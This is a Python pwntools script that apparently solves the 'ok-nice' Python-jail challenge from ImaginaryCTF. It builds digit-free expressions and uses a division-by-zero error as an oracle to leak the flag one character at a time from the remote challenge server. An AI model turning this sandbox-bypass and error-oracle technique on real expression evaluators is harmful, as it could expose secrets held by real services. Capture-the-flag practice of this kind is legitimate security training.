import string
from pwn import *

# p = process(['python3', 'jail.py'])
p = remote('ok-nice.chal.imaginaryctf.org', 1337)

flag = ''
one = '((flag)is(flag))'
zero = f'({one}-{one})'
cnt = 0

while True:
    idx = '+'.join([zero] + [one]*cnt)
    for c in string.printable.strip():
        print(f'[-] trying {flag+c} ...')
        ch = '+'.join([one]*ord(c))
        payload = f"((flag)is(flag))/(ord(flag[{idx}])-({ch}))"
        p.sendlineafter(b': ', payload)
        l = p.recvlineS()
        if 'error' in l:
            flag += chr(ord(c) - 1)
            print(f'[+] found! - {flag}')
            break
    
    else:
        print("?")
        break

    if flag[-1] == '}':
        break

    cnt += 1

print(f'[*] flag : {flag}')

p.close()